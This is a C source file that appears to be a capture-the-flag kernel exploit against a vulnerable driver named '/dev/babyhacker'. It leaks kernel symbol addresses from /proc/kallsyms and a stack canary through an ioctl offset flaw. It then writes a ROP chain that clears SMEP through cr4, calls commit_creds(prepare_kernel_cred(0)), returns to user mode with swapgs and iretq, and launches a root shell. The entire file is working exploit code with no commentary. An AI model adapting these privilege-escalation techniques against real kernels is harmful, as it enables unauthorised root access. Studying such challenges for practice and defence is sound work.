#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>

int fd;
size_t vmlinux_base = 0;
size_t kernel_off= 0xa1820;
size_t commit_off = 0xa1430;
size_t vmlinux_raw = 0xffffffff81000000;
size_t p_rdi_r = 0xffffffff8109054d;
size_t p_rdx_r = 0xffffffff81083f22;
size_t p_rcx_r = 0x0;
size_t mov_rdi_rax_call_rdx = 0x0;
size_t iretq = 0xffffffff8168b278;
size_t swapgs = 0xffffffff810636b4;
size_t user_ss, user_sp, user_cs, user_rflags;
size_t commit_creds = 0;
size_t prepare_kernel_cred = 0;
size_t mv_rc4_rdi_p_rbp_r = 0xffffffff81004d70;

void errpro(char* buf){
    printf("Error %s\n",buf);
    exit(-1);
}

void getroot(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}

void getshell(){
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        errpro("Not root");
    }
}

void savestatus(){
       __asm__("mov user_cs,cs;"
           "mov user_ss,ss;"
           "mov user_sp,rsp;"
           "pushf;"            //push eflags
           "pop user_rflags;"
          );
}

void ccopy(char* buf){
    if(-1 == ioctl(fd, 0x30001, buf)){
        errpro("ccopy");
    }
}

void cread(char* buf){
    if(-1 == ioctl(fd, 0x30002, buf)){
        errpro("cread");
    }
}

void setoff(size_t num){
    if(-1 == ioctl(fd, 0x30000, num)){
        errpro("setoff");
    }
}

void getVmlinux(){
    FILE* fd2 = fopen("/proc/kallsyms", "r");
    if(fd2 < 0){
        errpro("Open kallsyms");
    }

    char buf[0x30] = { 0 };
    while(fgets(buf, 0x30, fd2)){
        if(commit_creds && prepare_kernel_cred)
            return 0;
        
        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred){
            char hex[20] = { 0 };
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &prepare_kernel_cred);
            printf("prepare_kernel_creds: %p\n", prepare_kernel_cred);

            vmlinux_base = prepare_kernel_cred - kernel_off;
            printf("vmlinux_base: %p\n", vmlinux_base);    
        }
        
        if(strstr(buf, "commit_creds") && !commit_creds){
            char hex[20] = { 0 };
            strncpy(hex, buf, 16);
            sscanf(hex, "%llx", &commit_creds);
            printf("commit_creds: %p\n", commit_creds);

            vmlinux_base = commit_creds - commit_off;
            printf("vmlinux_base: %p\n", vmlinux_base);
        }
    }

    if(!commit_creds && !prepare_kernel_cred){
        errpro("Not get vmlinux_base");
    }
}


int main(){
    savestatus();
    getVmlinux();

    fd = open("/dev/babyhacker", 0);
    if(fd < 0){
        errpro("Open dev");
    }
    
    char buf[0x500] = { 0 };
    setoff(0xffffffffffff0000|(0x200));
    cread(buf);

    size_t canary = *(size_t*)((char*)buf+0x140);
    printf("canary: 0x%lx\n",canary);

    size_t rop[0x1000] = { 0 };
    int i = 0;
    for(i=0; i<42; i++){
        rop[i] = canary;
    }
    size_t offset = vmlinux_base - vmlinux_raw;
    rop[i++] = p_rdi_r+offset;
    rop[i++] = 0x6f0;
    rop[i++] = mv_rc4_rdi_p_rbp_r+offset;
    rop[i++] = 0;
    rop[i++] = (size_t)getroot;

    rop[i++] = swapgs+offset;
    rop[i++] = 0;

    rop[i++] = iretq+offset;

    rop[i++] = (size_t)getshell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    setoff(0xffffffffffff0000|(0x300));
    ccopy(rop);
    return 0;
}